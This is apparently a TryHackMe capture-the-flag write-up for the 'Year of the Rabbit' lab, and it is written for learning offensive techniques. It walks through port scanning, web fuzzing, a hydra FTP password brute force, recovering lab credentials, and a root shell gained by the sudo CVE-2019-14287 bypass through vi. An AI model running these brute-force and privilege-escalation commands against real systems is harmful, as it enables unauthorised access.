```bash
# PLATFORM          . THM
# CTF NAME          . Year of the Rabbit
# DESCRIPTION       . Time to enter the warren...
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/yearoftherabbit
```

```
sudo nmap -sSVC -T5 10.10.130.97 -p- -oN year
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a08b6b7809390332ea524c203e82ad60 (DSA)
|   2048 df25d0471f37d918818738763092651f (RSA)
|   256 be9f4f014a44c8adf503cb00ac8f4944 (ECDSA)
|_  256 dbb1c1b9cd8c9d604ff198e299fe0803 (ED25519)

80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- There's nothing much I could do with this information, so I fuzzed the webserver using `ffuf`.

```
ffuf -u http://10.10.130.97/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
```

- Inside `/assets`, we have `RickRolled.mp4` and a `.css` file.

- The CSS file reveals the next step of the challenge

```
Nice to see someone checking the stylesheets.
Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

- If we navigate to `ip/sup3r_s3cr3t_fl4g.php`, we get the following message: `Word of advice... Turn off your javascript...` and then we're redirected to the next [hint](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

- I didn't wanted to bother turning off JS on my browser just yet. I tried intercepting the request in Burp Suite, and, if we capture the response, there is an additional link between `sup3r_s3cr3t_fl4g.php` and the final redirect.

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
```

- Here, we can find a image called `Hot_Babe.png` 

- I had no other hints or directions so I assumed this is involves steganography, so I've downloaded the file.

- A simple `strings` reveals some useful information

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

- Let's find out which one it is

```
hydra -l ftpuser 10.10.130.97 -P passwords ftp -t 64 -I
```

- On the FTP server we find `Eli's Creds.txt` which is in brainfuck

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

```
User: eli
Password: DSpDiM1wAEwid
```

- After sshing to the box, we see the following mail:

```
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

- The path can be revealed using `find / -name s3cr3t 2>/dev/null`

```
ls -la

.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just {redacted}
Honestly!

Yours sincerely
   -Root
```

- So we got the password for gwendoline.. great ... security :) 

- The first flag is in `/home/gwendoline/user.txt`.

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

- This can be bypassed using [this](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) vulnerability.

```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

- After the vi opened the file, press `esc` and write `:!/bin/sh`.

- The last flag is in `/root/root.txt`